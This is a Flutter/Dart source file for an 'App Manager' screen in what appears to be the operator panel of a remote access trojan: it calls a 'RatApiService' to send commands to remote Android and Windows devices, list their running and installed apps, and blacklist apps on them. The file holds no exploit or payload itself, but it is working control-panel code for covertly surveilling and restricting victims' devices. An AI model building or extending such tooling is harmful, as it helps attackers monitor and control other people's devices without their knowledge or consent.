import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'api_service.dart';
import 'constants.dart';

const _kBg   = Color(0xFF111827);
const _kCard = Color(0xFF1F2937);
const _kBlue = Color(0xFF3B82F6);
const _kCyan = Color(0xFF06B6D4);
const _kRed  = Color(0xFFEF4444);
const _kSub  = Color(0xFF9CA3AF);

class AppManagerScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const AppManagerScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<AppManagerScreen> createState() => _AppManagerScreenState();
}

class _AppManagerScreenState extends State<AppManagerScreen> with SingleTickerProviderStateMixin {
  late RatApiService _api;
  late TabController _tab;
  List<dynamic> _running = [], _installed = [];
  List<String> _blacklist = [];
  bool _loadingR = false, _loadingI = false;
  String _searchQuery = '';
  final _pkgCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _tab = TabController(length: 3, vsync: this);
    _tab.addListener(() { if (_tab.indexIsChanging) _loadTab(_tab.index); });
    _loadTab(0);
  }

  @override
  void dispose() { _tab.dispose(); _pkgCtrl.dispose(); super.dispose(); }

  Future<void> _loadTab(int i) async {
    if (i == 0) await _fetchRunning();
    else if (i == 1) await _fetchInstalled();
    else await _fetchBlacklist();
  }

  Future<void> _fetchRunning() async {
    setState(() => _loadingR = true);
    try {
      await _api.sendCommand(widget.deviceId, 'GET_RUNNING_APPS');
      await Future.delayed(const Duration(seconds: 4));
      final r = await _api.getRunningApps(widget.deviceId);
      setState(() => _running = r ?? []);
    } catch(_) {} finally { setState(() => _loadingR = false); }
  }

  Future<void> _fetchInstalled() async {
    setState(() => _loadingI = true);
    try {
      await _api.sendCommand(widget.deviceId, 'GET_INSTALLED_APPS');
      await Future.delayed(const Duration(seconds: 5));
      final r = await _api.getInstalledApps(widget.deviceId);
      setState(() => _installed = r ?? []);
    } catch(_) {} finally { setState(() => _loadingI = false); }
  }

  Future<void> _fetchBlacklist() async {
    final r = await _api.getBlacklist(widget.deviceId);
    setState(() => _blacklist = r.map((e) => e.toString()).toList());
  }

  Future<void> _addBlacklist(String pkg) async {
    pkg = pkg.trim();
    if (pkg.isEmpty) return;
    await _api.sendCommand(widget.deviceId, 'BLACKLIST_APP', args: pkg);
    setState(() { if (!_blacklist.contains(pkg)) _blacklist.add(pkg); });
    _pkgCtrl.clear();
  }

  Future<void> _removeBlacklist(String pkg) async {
    await _api.sendCommand(widget.deviceId, 'BLACKLIST_REMOVE', args: pkg);
    setState(() => _blacklist.remove(pkg));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _kBg,
      appBar: AppBar(
        backgroundColor: _kCard,
        elevation: 0,
        leading: GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(margin: const EdgeInsets.all(10), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(8), border: Border.all(color: Colors.white12)), child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16)),
        ),
        title: Row(children: [
          Container(padding: const EdgeInsets.all(7), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(9)), child: const Icon(Icons.apps_rounded, color: Colors.white, size: 16)),
          const SizedBox(width: 10),
          const Text('App Manager', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w700, fontSize: 16)),
        ]),
        bottom: TabBar(
          controller: _tab,
          labelColor: _kBlue,
          unselectedLabelColor: _kSub,
          indicatorColor: _kBlue,
          indicatorWeight: 2,
          tabs: const [
            Tab(icon: Icon(Icons.play_circle_outline, size: 18), text: 'Running'),
            Tab(icon: Icon(Icons.apps_rounded, size: 18), text: 'Installed'),
            Tab(icon: Icon(Icons.block_rounded, size: 18), text: 'Blacklist'),
          ],
        ),
        actions: [
          IconButton(icon: const Icon(Icons.refresh_rounded, color: _kSub), onPressed: () => _loadTab(_tab.index)),
        ],
      ),
      body: TabBarView(controller: _tab, children: [_buildRunning(), _buildInstalled(), _buildBlacklist()]),
    );
  }

  Widget _buildRunning() {
    if (_loadingR) return const Center(child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2));
    if (_running.isEmpty) return _empty('No running app data.\nTap refresh to fetch.', Icons.play_circle_outline);
    return ListView.builder(
      padding: const EdgeInsets.all(14),
      physics: const BouncingScrollPhysics(),
      itemCount: _running.length,
      itemBuilder: (_, i) {
        final app = _running[i];
        return _appCard(
          label: app['name']?.toString() ?? app['processName']?.toString() ?? 'Unknown',
          sub: app['package']?.toString() ?? '',
          icon: Icons.play_arrow_rounded,
          trailing: Text(app['pid']?.toString() ?? '', style: const TextStyle(color: _kSub, fontSize: 11)),
        );
      },
    );
  }

  Widget _buildInstalled() {
    if (_loadingI) return const Center(child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2));
    final filtered = _installed.where((a) {
      final q = _searchQuery.toLowerCase();
      return q.isEmpty || 
             (a['label']?.toString().toLowerCase().contains(q) ?? false) || 
             (a['name']?.toString().toLowerCase().contains(q) ?? false) ||
             (a['package']?.toString().toLowerCase().contains(q) ?? false);
    }).toList();
    return Column(children: [
      Padding(
        padding: const EdgeInsets.all(14),
        child: TextField(
          style: const TextStyle(color: Colors.white, fontSize: 14),
          decoration: InputDecoration(
            hintText: 'Search apps...', hintStyle: const TextStyle(color: _kSub),
            prefixIcon: const Icon(Icons.search_rounded, color: _kSub, size: 20),
            filled: true, fillColor: _kCard.withOpacity(0.8),
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
            enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _kBlue.withOpacity(0.2))),
            focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: _kBlue, width: 1.5)),
          ),
          onChanged: (v) => setState(() => _searchQuery = v),
        ),
      ),
      Expanded(
        child: filtered.isEmpty
          ? _empty('No apps found', Icons.apps_outage)
          : ListView.builder(
              padding: const EdgeInsets.symmetric(horizontal: 14),
              physics: const BouncingScrollPhysics(),
              itemCount: filtered.length,
              itemBuilder: (_, i) {
                final app = filtered[i];
                final isSys = app['isSystem'] == true || app['is_system'] == true;
                bool isWin = widget.deviceId.startsWith('WIN-');
                return _appCard(
                  label: app['label']?.toString() ?? app['name']?.toString() ?? 'Unknown',
                  sub: app['package']?.toString() ?? '',
                  icon: isSys ? Icons.settings_applications_rounded : (isWin ? Icons.desktop_windows_rounded : Icons.android_rounded),
                  trailing: isSys ? Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: const Color(0xFFF59E0B).withOpacity(0.15), borderRadius: BorderRadius.circular(6), border: Border.all(color: const Color(0xFFF59E0B).withOpacity(0.3))), child: const Text('SYS', style: TextStyle(color: Color(0xFFF59E0B), fontSize: 9, fontWeight: FontWeight.bold))) : null,
                  onLongPress: () => _quickMenu(app['package']?.toString() ?? ''),
                );
              },
            ),
      ),
    ]);
  }

  void _quickMenu(String pkg) {
    if (pkg.isEmpty) return;
    showModalBottomSheet(context: context, backgroundColor: _kCard,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (_) => Padding(padding: const EdgeInsets.all(20), child: Column(mainAxisSize: MainAxisSize.min, children: [
        Container(width: 40, height: 4, decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2))),
        const SizedBox(height: 16),
        Text(pkg, style: const TextStyle(color: _kSub, fontSize: 12)),
        const SizedBox(height: 16),
        GestureDetector(
          onTap: () { Navigator.pop(context); _addBlacklist(pkg); },
          child: Container(
            width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 14),
            decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kRed, Color(0xFFDC2626)]), borderRadius: BorderRadius.circular(12)),
            child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
              Icon(Icons.block_rounded, color: Colors.white, size: 18),
              SizedBox(width: 8),
              Text('Add to Blacklist', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w700)),
            ]),
          ),
        ),
      ])),
    );
  }

  Widget _buildBlacklist() {
    return Column(children: [
      Padding(
        padding: const EdgeInsets.all(14),
        child: Row(children: [
          Expanded(child: TextField(
            controller: _pkgCtrl,
            style: const TextStyle(color: Colors.white, fontSize: 13),
            decoration: InputDecoration(
              hintText: 'com.example.app', hintStyle: const TextStyle(color: _kSub),
              prefixIcon: const Icon(Icons.block_rounded, color: _kRed, size: 18),
              filled: true, fillColor: _kCard.withOpacity(0.8),
              contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: _kRed.withOpacity(0.2))),
              focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: _kRed, width: 1.5)),
            ),
          )),
          const SizedBox(width: 10),
          GestureDetector(
            onTap: () => _addBlacklist(_pkgCtrl.text),
            child: Container(padding: const EdgeInsets.all(14), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kRed, Color(0xFFDC2626)]), borderRadius: BorderRadius.circular(12)), child: const Icon(Icons.add_rounded, color: Colors.white)),
          ),
        ]),
      ),
      Expanded(
        child: _blacklist.isEmpty
          ? _empty('No apps blacklisted.\nAdd a package name above.', Icons.check_circle_outline)
          : ListView.builder(
              padding: const EdgeInsets.symmetric(horizontal: 14),
              physics: const BouncingScrollPhysics(),
              itemCount: _blacklist.length,
              itemBuilder: (_, i) => Container(
                margin: const EdgeInsets.only(bottom: 8),
                decoration: BoxDecoration(gradient: LinearGradient(colors: [_kCard.withOpacity(0.9), _kBg.withOpacity(0.9)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _kRed.withOpacity(0.25))),
                child: ListTile(
                  leading: const Icon(Icons.block_rounded, color: _kRed, size: 18),
                  title: Text(_blacklist[i], style: const TextStyle(color: Colors.white, fontSize: 12)),
                  trailing: GestureDetector(
                    onTap: () => _removeBlacklist(_blacklist[i]),
                    child: const Icon(Icons.delete_outline_rounded, color: _kSub, size: 20),
                  ),
                ),
              ),
            ),
      ),
    ]);
  }

  Widget _appCard({required String label, required String sub, required IconData icon, Widget? trailing, VoidCallback? onLongPress}) {
    return GestureDetector(
      onLongPress: onLongPress,
      child: Container(
        margin: const EdgeInsets.only(bottom: 8),
        decoration: BoxDecoration(gradient: LinearGradient(colors: [_kCard.withOpacity(0.9), _kBg.withOpacity(0.9)]), borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBlue.withOpacity(0.12))),
        child: ListTile(
          leading: Container(padding: const EdgeInsets.all(7), decoration: BoxDecoration(gradient: const LinearGradient(colors: [_kBlue, _kCyan]), borderRadius: BorderRadius.circular(8)), child: Icon(icon, color: Colors.white, size: 16)),
          title: Text(label, style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w600), maxLines: 1, overflow: TextOverflow.ellipsis),
          subtitle: Text(sub, style: const TextStyle(color: _kSub, fontSize: 10), maxLines: 1, overflow: TextOverflow.ellipsis),
          trailing: trailing,
        ),
      ),
    );
  }

  Widget _empty(String msg, IconData icon) => Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
    Container(padding: const EdgeInsets.all(20), decoration: BoxDecoration(color: _kCard.withOpacity(0.5), borderRadius: BorderRadius.circular(16), border: Border.all(color: _kBlue.withOpacity(0.15))), child: Icon(icon, size: 48, color: _kBlue.withOpacity(0.3))),
    const SizedBox(height: 14),
    Text(msg, textAlign: TextAlign.center, style: const TextStyle(color: _kSub, fontSize: 13)),
  ]));
}
